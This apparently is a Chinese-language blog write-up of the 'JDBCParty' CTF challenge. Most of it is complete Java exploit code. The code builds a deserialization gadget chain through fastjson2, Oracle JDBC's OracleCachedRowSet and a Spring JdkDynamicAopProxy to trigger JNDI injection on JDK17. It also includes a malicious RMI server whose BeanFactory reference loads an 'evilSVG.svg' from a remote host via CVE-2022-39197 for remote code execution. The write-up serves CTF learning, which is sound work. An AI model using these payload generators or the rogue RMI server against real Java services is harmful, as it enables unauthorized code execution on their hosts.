        <content type="html"><![CDATA[<h2 id="JDBCParty"><a href="#JDBCParty" class="headerlink" title="JDBCParty"></a>JDBCParty</h2><p>题目存在明显反序列化点</p><h3 id="考点"><a href="#考点" class="headerlink" title="考点:"></a>考点:</h3><p>高版本 (jdk17) CVE-2022-39197<br>[[CVE-2022-39197 CS RCE]]</p><p><a href="https://www.n4c1.top/2025/10/02/CVE-2022-39197-CS-RCE/">https://www.n4c1.top/2025/10/02/CVE-2022-39197-CS-RCE/</a></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250929220821.png" alt="image.png"></p><p>这个setURI就是最终的sink点, 题目存在 fastjson2和jackson依赖, 所以思路就是通过反序列化调用setter然后RCE</p><p>题目有oracleJDBC依赖  fastjson2 (2.0.37) 依赖 jackson依赖<br>这几个json库都是可以用来触发toString –&gt; getter, 但我们最终要调用的其实是一个setter<br>思路是利用oracleJDBC依赖, 调用它的getter(<code>getConnection</code>)来打JNDI, 伪造恶意rmi服务器, 返回远程对象, 打高版本JDK的JNDI注入</p><p>首先是 readObect –&gt; toString –&gt; getter<br>前半段的 readObect –&gt; toString, 我们在 <a href="https://github.com/LxxxSec/CTF-Java-Gadget">CTF-Java-Gadget</a>这个项目中就能找到几条可以用的, 这里选用<code>EventListenerListReadObject2ToString</code><br>toString –&gt; getter 直接选用 fastjson2原生反序列化链,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationConfig;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.OracleConnectionWrapper;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.driver.LogicalConnection;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.internal.OracleConnection;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.pool.OraclePooledConnection;  </span><br><span class="line"><span class="keyword">import</span> org.apache.batik.swing.JSVGCanvas;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONObject;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.rowset.OracleCachedRowSet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;  </span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> java.util.Vector;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.n4c1.tools.advanced.UnSafeTools;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;  </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.RowSetInternal;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  org.n4c1.tools.Tools;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.bypassModule(Test.class, Class.class);  </span><br><span class="line">        <span class="type">OracleCachedRowSet</span> <span class="variable">oracleCachedRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OracleCachedRowSet</span>();  </span><br><span class="line">  </span><br><span class="line">        oracleCachedRowSet.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/cwx0mc&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;monitorLock&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();  </span><br><span class="line">        vector1.add(<span class="number">0</span>,<span class="string">&quot;111&quot;</span>);  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();  </span><br><span class="line">        vector2.add(<span class="number">0</span>,<span class="string">&quot;222&quot;</span>);  </span><br><span class="line">        String[] metaData= <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;111&quot;</span>,<span class="string">&quot;222&quot;</span>&#125;;  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnIndexes&quot;</span>),vector1);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnNames&quot;</span>),vector2);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;metaData&quot;</span>),metaData);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;reader&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;writer&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;syncProvider&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        jsonObject.put(<span class="string">&quot;n4c1&quot;</span>, oracleCachedRowSet);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();  </span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);  </span><br><span class="line">        <span class="comment">/////////////  </span></span><br><span class="line">        vector.add(jsonObject);  </span><br><span class="line">        setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tools.serialize2base64(list);  </span><br><span class="line">        System.out.println(poc);  </span><br><span class="line">        Tools.string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> obj.getClass();  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                field = c.getDeclaredField(fieldName);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;  </span><br><span class="line">                c = c.getSuperclass();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);  </span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        dField.set(obj, val);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题:"></a>遇到的问题:</h3><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><p>OK, 当我们直接写出这条链然后测试会发现, 确实触发到了getter, 但是在getConnection之前就触发了getCursorName(), 这个方法直接抛出错误<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251002180349.png" alt="image.png"></p><h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>当我使用jackson来替换fastjson2时, 发现在序列化时就触发getConnection(), 导致生成不了poc</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>由于题目存在spring依赖, 那么第一时间考虑的方法就是使用<code>JdkDynamicAopProxy</code>动态代理, 这个方法在 # 高版本Fastjson在Java原生反序列化 和 稳定jackson反序列化触发getter时都有用到<br>参考<br><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"># 关于java反序列化中jackson链子不稳定问题</a><br>getConnection的上层接口是RowSetInternal, 直接写出exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationConfig;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.OracleConnectionWrapper;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.driver.LogicalConnection;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.internal.OracleConnection;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.pool.OraclePooledConnection;  </span><br><span class="line"><span class="keyword">import</span> org.apache.batik.swing.JSVGCanvas;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONObject;  </span><br><span class="line"><span class="keyword">import</span> oracle.jdbc.rowset.OracleCachedRowSet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;  </span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> java.util.Vector;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.n4c1.tools.advanced.UnSafeTools;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;  </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.RowSetInternal;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;  </span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="comment">//import org.springframework.aop.framework.JdkDynamicAopProxy  </span></span><br><span class="line"><span class="keyword">import</span>  org.n4c1.tools.Tools;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.bypassModule(Test.class, Class.class);  </span><br><span class="line">        <span class="type">OracleCachedRowSet</span> <span class="variable">oracleCachedRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OracleCachedRowSet</span>();  </span><br><span class="line">  </span><br><span class="line">        oracleCachedRowSet.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/cwx0mc&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;monitorLock&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();  </span><br><span class="line">        vector1.add(<span class="number">0</span>,<span class="string">&quot;111&quot;</span>);  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();  </span><br><span class="line">        vector2.add(<span class="number">0</span>,<span class="string">&quot;222&quot;</span>);  </span><br><span class="line">        String[] metaData= <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;111&quot;</span>,<span class="string">&quot;222&quot;</span>&#125;;  </span><br><span class="line">  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnIndexes&quot;</span>),vector1);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;matchColumnNames&quot;</span>),vector2);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;metaData&quot;</span>),metaData);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;reader&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;writer&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="string">&quot;syncProvider&quot;</span>),<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);  </span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();  </span><br><span class="line">        advisedSupport.setTarget(oracleCachedRowSet);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;RowSetInternal.class&#125;, handler);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        jsonObject.put(<span class="string">&quot;n4c1&quot;</span>, proxyObj);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();  </span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);  </span><br><span class="line">        <span class="comment">/////////////  </span></span><br><span class="line">        vector.add(jsonObject);  </span><br><span class="line">        setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tools.serialize2base64(list);  </span><br><span class="line">        System.out.println(poc);  </span><br><span class="line">        Tools.string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> obj.getClass();  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                field = c.getDeclaredField(fieldName);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;  </span><br><span class="line">                c = c.getSuperclass();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);  </span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        dField.set(obj, val);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样生成的poc就可以完美触发到getConnection<br>之后就是伪造rmi server</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.apache.batik.swing.JSVGCanvas&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,  </span><br><span class="line">                <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;URI=test&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;URI&quot;</span>, <span class="string">&quot;http://127.0.0.1:8001/evilSVG.svg&quot;</span>));  </span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);  </span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于是高版本jdk, 有module限制, rmiServer在编译和运行时分别需要设置命令行参数和jvm参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-modules jdk.naming.rmi --add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251002210612.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251002210632.png" alt="image.png"><br>之后按照[[CVE-2022-39197 CS RCE]]构造jar包和svg即可RCE<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251002210936.png" alt="image.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://xz.aliyun.com/news/14169">https://xz.aliyun.com/news/14169</a><br><a href="https://nlrvana.github.io/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E8%B5%9B-jdbcparty/">https://nlrvana.github.io/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E8%B5%9B-jdbcparty/</a><br><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B">https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B</a><br><a href="https://www.ctfiot.com/223628.html">https://www.ctfiot.com/223628.html</a></p>]]></content>
      
      
